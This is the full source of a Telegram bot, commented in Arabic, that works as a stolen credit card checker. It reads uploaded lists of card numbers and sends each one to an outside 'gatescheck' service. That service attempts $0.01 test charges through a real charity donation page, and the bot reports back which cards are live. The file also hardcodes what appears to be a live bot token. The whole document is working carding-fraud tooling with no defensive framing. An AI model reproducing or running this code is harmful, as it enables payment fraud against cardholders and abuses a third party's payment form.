import os
import re
import httpx
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# توكن البوت الخاص بك
TOKEN = '7327856614:AAG9fY6rjp_wPKTLNnQCgoZdzagla3h9-80'

# رابط API للتحقق من البطاقة
API_URL = "http://gatescheck.duckdns.org:7000/check"

# إعداد عميل httpx بمهلة مرتفعة
http_client = httpx.AsyncClient(timeout=60.0)  # 60 ثانية مهلة

# دالة للتحقق من حالة البطاقة عبر API
async def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.01
    }
    try:
        response = await http_client.get(API_URL, params=params)
        result = response.json().get('result', '').lower()
        return result
    except Exception as e:
        return f"خطأ في التحقق: {e}"

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not os.path.exists('downloads'):
            os.makedirs('downloads')

        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        report_lines = []

        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        for line in lines:
            line = line.strip()
            card_number_matches = re.findall(r'\d+', line)
            if card_number_matches:
                card_number = card_number_matches[0]
                result = await check_card_api(card_number)
                # إرسال رسالة فقط إذا كانت النتيجة charge أو Insufficient Funds
                if result in ['charge', 'insufficient funds']:
                    await update.message.reply_text(f"رقم الفيزا: {card_number} - النتيجة: {result}")
                report_lines.append(f"رقم الفيزا: {card_number} - النتيجة: {result}")
            else:
                report_lines.append(f"السطر: {line} لا يحتوي على رقم فيزا.")

        # إرسال تقرير كامل
        report = "\n".join(report_lines)
        await update.message.reply_text(f"نتائج الفحص:\n{report}")

    except Exception as e:
        await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('Hello Sir Developer!')

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == '__main__':
    main()
